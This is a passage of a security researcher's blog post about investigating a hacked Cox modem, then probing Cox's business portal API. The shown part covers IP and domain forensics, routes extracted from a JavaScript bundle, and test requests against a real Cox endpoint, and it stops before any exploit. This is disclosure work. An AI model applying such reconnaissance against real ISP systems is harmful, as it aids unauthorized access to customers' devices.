found.\"}]}]]}]}]],\"notFoundStyles\":[],\"styles\":null}]}]]}],null]],\"initialHead\":[false,\"$Lc\"],\"globalErrorComponent\":\"$d\",\"missingSlots\":\"$We\"}]]\n"])</script><script>self.__next_f.push([1,"f:I[4027,[\"303\",\"static/chunks/303-8cee44aa9b5efa51.js\",\"42\",\"static/chunks/app/%5Bslug%5D/page-af402571294e470f.js\"],\"TableOfContents\"]\n10:I[6433,[\"303\",\"static/chunks/303-8cee44aa9b5efa51.js\",\"42\",\"static/chunks/app/%5Bslug%5D/page-af402571294e470f.js\"],\"Image\"]\n11:I[233,[\"303\",\"static/chunks/303-8cee44aa9b5efa51.js\",\"42\",\"static/chunks/app/%5Bslug%5D/page-af402571294e470f.js\"],\"\"]\n"])</script><script>self.__next_f.push([1,"8:[\"$\",\"div\",null,{\"className\":\"__className_ac79ff w-full h-full flex justify-center dark:[color-scheme:dark]\",\"children\":[\"$\",\"div\",null,{\"className\":\"space-y-4 max-w-full md:max-w-3xl\",\"children\":[null,[\"$\",\"aside\",null,{\"className\":\"fixed transform -translate-x-72 opacity-0 xl:block xl:opacity-100 transition-opacity\",\"children\":[\"$\",\"nav\",null,{\"className\":\"flex flex-col gap-8\",\"children\":[[\"$\",\"a\",null,{\"href\":\"/\",\"className\":\"text-sm\",\"children\":\"‹ Back\"}],[\"$\",\"$Lf\",null,{\"headings\":[{\"slug\":\"introduction\",\"title\":\"Introduction\",\"level\":1},{\"slug\":\"who-are-you-1596576209\",\"title\":\"Who are you, 159.65.76.209?\",\"level\":2},{\"slug\":\"hackers-hacking-hackers\",\"title\":\"Hackers Hacking Hackers?\",\"level\":2},{\"slug\":\"handing-over-evidence\",\"title\":\"Handing Over Evidence\",\"level\":2},{\"slug\":\"three-years-later\",\"title\":\"Three Years Later\",\"level\":2},{\"slug\":\"targeting-rest-apis-using-the-tr-069-protocol\",\"title\":\"Targeting REST APIs using the TR-069 Protocol\",\"level\":2},{\"slug\":\"hacking-millions-of-modems\",\"title\":\"Hacking Millions of Modems\",\"level\":1},{\"slug\":\"http-request-that-does-not-start-with-apicbma-returns-301\",\"title\":\"HTTP request that does not start with api/cbma (returns 301):\",\"level\":3},{\"slug\":\"http-request-that-does-start-with-apicbma-returns-500\",\"title\":\"HTTP request that does start with api/cbma (returns 500):\",\"level\":3},{\"slug\":\"loading-static-resources-from-reverse-proxy-api\",\"title\":\"Loading Static Resources from Reverse Proxy API\",\"level\":3},{\"slug\":\"accidentally-discovering-an-authorization-bypass-on-the-cox-backend-api\",\"title\":\"Accidentally Discovering an Authorization Bypass on the Cox Backend API\",\"level\":3},{\"slug\":\"confirming-we-can-access-anyones-equipment\",\"title\":\"Confirming We Can Access Anyone's Equipment\",\"level\":3},{\"slug\":\"accessing-and-updating-any-cox-business-customer-account\",\"title\":\"Accessing and Updating any Cox Business Customer Account\",\"level\":3},{\"slug\":\"overwriting-anyones-device-settings-via-leaked-cryptographic-secret\",\"title\":\"Overwriting Anyone's Device Settings via Leaked Cryptographic Secret\",\"level\":3},{\"slug\":\"executing-commands-on-any-modem\",\"title\":\"Executing Commands on Any Modem\",\"level\":2},{\"slug\":\"impact\",\"title\":\"Impact\",\"level\":2},{\"slug\":\"addendum\",\"title\":\"Addendum\",\"level\":2},{\"slug\":\"timeline\",\"title\":\"Timeline\",\"level\":2},{\"slug\":\"thanks\",\"title\":\"Thanks\",\"level\":2}]}]]}]}],\"$undefined\",[\"$\",\"main\",null,{\"className\":\"prose max-w-none prose-blue prose-img:rounded-md prose-img:w-full dark:prose-invert text-lg break-words\",\"children\":[[\"$\",\"div\",null,{\"children\":[[\"$\",\"a\",null,{\"href\":\"/\",\"className\":\"opacity-100 xl:opacity-0 transition-opacity text-sm my-2 text-neutral-700 dark:text-zinc-400 dark:hover:text-neutral-300\",\"children\":\"‹ Back\"}],[\"$\",\"h1\",null,{\"className\":\"text-3xl my-0\",\"children\":\"Hacking Millions of Modems (and Investigating Who Hacked My Modem)\"}],[\"$\",\"small\",null,{\"children\":[\"$\",\"time\",null,{\"dateTime\":\"2024-06-03T00:00:00.000Z\",\"children\":\"Mon Jun 03 2024\"}]}]]}],[\"$\",\"$L10\",null,{\"src\":\"/images/hacking-millions-of-modems/cover.png\",\"alt\":\"Hacking Millions of Modems (and Investigating Who Hacked My Modem)\",\"width\":500,\"height\":500,\"unoptimized\":true}],[\"$\",\"div\",null,{\"className\":\"pt-4\",\"children\":[[\"$\",\"h1\",null,{\"id\":\"introduction\",\"children\":\"Introduction\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"python3 -m http.server 8000\\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"curl \\\"http://54.156.88.125:8000/test123\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Just a few seconds later, I saw the following log:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"98.161.24.100 - [16:32:12] \\\"GET /test123 HTTP/1.1\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"98.161.24.100 - [16:32:12] \\\"GET /test123 HTTP/1.1\\\"\\n159.65.76.209 - [16:32:22] \\\"GET /test123 HTTP/1.1\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"An unknown IP address had replayed the exact same HTTP request just 10 seconds later.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"\\\"Wow, that’s seriously weird,\\\" I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"98.161.24.100 - [16:34:04] \\\"GET /uhhhh HTTP/1.1\\\"\\n159.65.76.209 - [16:34:16] \\\"GET /uhhhh HTTP/1.1\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow.\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"sudo service nginx start\\ntail -f /var/log/nginx/access.log\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I opened the URL once again from my iPhone and saw the exact same logs:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":\"98.161.24.100 - [16:44:04] \\\"GET /whatisgoingon1234 HTTP/1.1\\\"\\n159.65.76.209 - [16:44:12] \\\"GET /whatisgoingon1234 HTTP/1.1\\\"\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"who-are-you-1596576209\",\"children\":\"Who are you, 159.65.76.209?\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/rN9k23w.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"regional.adidas.com.py (2019/11/26)\\nisglatam.online (2019/12/08)\\nisglatam.tk (2020/11/11)\\nmx12.limit742921.tokyo (2021/08/08)\\nmx12.jingoism44769.xyz (2022/04/12)\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Two of the domains associated with the 159.65.76.209 IP address were \",[\"$\",\"code\",null,{\"children\":\"isglatam.online\",\"className\":\"__className_8a4d12\"}],\" and \",[\"$\",\"code\",null,{\"children\":\"isglatam.tk\",\"className\":\"__className_8a4d12\"}],\". These were both at one point in time phishing websites for \",[\"$\",\"code\",null,{\"children\":\"isglatam.com\",\"className\":\"__className_8a4d12\"}],\", a South American cybersecurity company.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"hackers-hacking-hackers\",\"children\":\"Hackers Hacking Hackers?\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C\u0026C server for router malware?\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/pUxs47C.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Through URLscan, I learned that the \",[\"$\",\"code\",null,{\"children\":\"isglatam.online\",\"className\":\"__className_8a4d12\"}],\" and \",[\"$\",\"code\",null,{\"children\":\"isglatam.tk\",\"className\":\"__className_8a4d12\"}],\" websites were hosting generic BeEF phishing sites that can historically be seen \",[\"$\",\"a\",null,{\"href\":\"https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"here\"}],\".\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/WjapByA.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"handing-over-evidence\",\"children\":\"Handing Over Evidence\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/cWsUSw3.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only \",[\"$\",\"em\",null,{\"children\":\"renting\"}],\" it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no \\\"other IP\\\" in the logs. Everything seemed fixed.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I gave up trying to figure it out. At least for the time being.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"three-years-later\",\"children\":\"Three Years Later\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (\",[\"$\",\"code\",null,{\"children\":\"limit742921.tokyo\",\"className\":\"__className_8a4d12\"}],\" and \",[\"$\",\"code\",null,{\"children\":\"jingoism44769.xyz\",\"className\":\"__className_8a4d12\"}],\"). They pulled the IP address of the \",[\"$\",\"code\",null,{\"children\":\"mx1\",\"className\":\"__className_8a4d12\"}],\" subdomain for \",[\"$\",\"code\",null,{\"children\":\"limit742921.tokyo\",\"className\":\"__className_8a4d12\"}],\" and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrname\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"acquire543225.biz.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrtype\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"A\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rdata\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"153.127.55.212\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrname\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"battery935904.biz.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrtype\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"A\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rdata\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"153.127.55.212\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrname\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"grocery634272.biz.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrtype\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"A\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rdata\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"153.127.55.212\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrname\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"seventy688181.biz.\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rrtype\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"A\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\",\"}],[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"rdata\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"153.127.55.212\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Every single domain that was registered by the discovered IP address used the same naming convention:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"[word][6 numbers].[TLD]\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C\u0026C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C\u0026C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C\u0026C server.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/jn9s1Fl.jpeg\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"targeting-rest-apis-using-the-tr-069-protocol\",\"children\":\"Targeting REST APIs using the TR-069 Protocol\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/272GG8M.jpeg\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.\"}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"hacking-millions-of-modems\",\"children\":\"Hacking Millions of Modems\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/q6bmDy5.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the \",[\"$\",\"code\",null,{\"children\":\"main.36624ed36fb0ff5b.js\",\"className\":\"__className_8a4d12\"}],\" file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/\\n/api/cbma/profile/services/profile/userroles/\\n/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice\\n/api/cbma/accountequipment/services/accountequipment/casedetail\\n/api/cbma/user/identity/services/useridentity/user/verifyContact\\n/api/cbma/user/identity/services/useridentity/user/contact/validate\\n...\\n\",\"className\":\"__className_8a4d12\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"There were over 100 different API calls that all had the same base path of \",[\"$\",\"code\",null,{\"children\":\"/api/cbma/\",\"className\":\"__className_8a4d12\"}],\". Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the \",[\"$\",\"code\",null,{\"children\":\"/api/cbma/\",\"className\":\"__className_8a4d12\"}],\" endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:\"]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"http-request-that-does-not-start-with-apicbma-returns-301\",\"children\":\"HTTP request that does not start with api/cbma (returns 301):\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/anything_else/example\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"301\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Moved\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Permanently\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Location:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"https://myaccount-business.cox.com/cbma/api/anything_else/example\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"http-request-that-does-start-with-apicbma-returns-500\",\"children\":\"HTTP request that does start with api/cbma (returns 500):\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/example\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"500\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Internal\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Server\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Error\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Server:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"nginx\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"From sending the above HTTP requests, we learn that the \",[\"$\",\"code\",null,{\"children\":\"api/cbma\",\"className\":\"__className_8a4d12\"}],\" endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides 